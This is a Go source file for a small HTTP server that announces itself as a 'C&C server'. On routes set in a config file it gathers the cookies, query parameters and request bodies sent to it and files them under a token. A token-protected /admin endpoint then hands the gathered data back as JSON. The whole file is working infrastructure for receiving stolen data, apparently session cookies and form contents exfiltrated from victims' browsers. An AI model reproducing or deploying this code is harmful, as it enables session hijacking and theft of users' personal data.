package main

import (
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"gopkg.in/yaml.v3"
)

type Config struct {
	Routes map[string]Route `yaml:"routes"`
}

type Route struct {
	Path   string `yaml:"path"`
	Method string `yaml:"method"`
}

type Payload struct {
	Cookies map[string]string `json:"cookies"`
	Params  map[string]string `json:"params"`
	Body    string            `json:"body"`
}

var payloads = make(map[string]Payload)

func ReadConfig() *Config {
	var config Config
	filename, _ := filepath.Abs("./config.yml")
	yamlFile, err := ioutil.ReadFile(filename)
	if err != nil {
		panic(err)
	}
	err = yaml.Unmarshal(yamlFile, &config)
	if err != nil {
		fmt.Println(err.Error())
	}
	return &config
}
func scriptEndpoint(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("X-Auth-Token") == os.Getenv("AUTH_TOKEN") {
		token := r.URL.Query().Get("token")
		w.Header().Set("Content-Type", "application/json")
		if payload, ok := payloads[token]; ok {
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(payload)
			return
		}
		w.WriteHeader(http.StatusNotFound)
		json.NewEncoder(w).Encode(map[string]string{"details": "not found"})
	}
}

func payloadEndpoint(w http.ResponseWriter, r *http.Request) {
	config := ReadConfig()
	var payload Payload
	path := strings.Split(r.URL.Path, "/")
	if len(path) != 3 {
		http.Error(w, "invalid path", http.StatusBadRequest)
		return
	}
	endpoint, token := path[1], path[2]
	log.Println(endpoint, token)
	for _, values := range config.Routes {
		if endpoint == values.Path {
			if r.Method == values.Method {
				if len(r.Cookies()) > 0 {
					payload.Cookies = make(map[string]string)
					for _, cookie := range r.Cookies() {
						cookies := strings.Split(cookie.String(), "=")
						key, value := cookies[0], cookies[1]
						payload.Cookies[key] = value
					}
				}
				if len(r.URL.Query()) > 0 {
					payload.Params = make(map[string]string)
					for key := range r.URL.Query() {
						payload.Params[key] = r.URL.Query().Get(key)
					}

				}
				if r.Method == "POST" || r.Method == "PUT" || r.Method == "PATCH" {
					b, err := io.ReadAll(r.Body)
					if err != nil {
						log.Fatalln(err)
					}
					if len(b) > 0 {
						payload.Body = string(b)
					}

				}
				payloads[token] = payload
				fmt.Fprintf(w, "ok\n")
				return
			} else {
				fmt.Fprintf(w, "Method not allowed\n")
				return
			}
		}
	}
	http.Error(w, "404 not found.", http.StatusNotFound)
}

func router(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path == "/admin" {
		scriptEndpoint(w, r)
	} else {
		payloadEndpoint(w, r)
	}

}

func main() {

	http.HandleFunc("/", router)

	fmt.Printf("Starting C&C server...\n")
	if err := http.ListenAndServe(":8888", nil); err != nil {
		log.Fatal(err)
	}
}
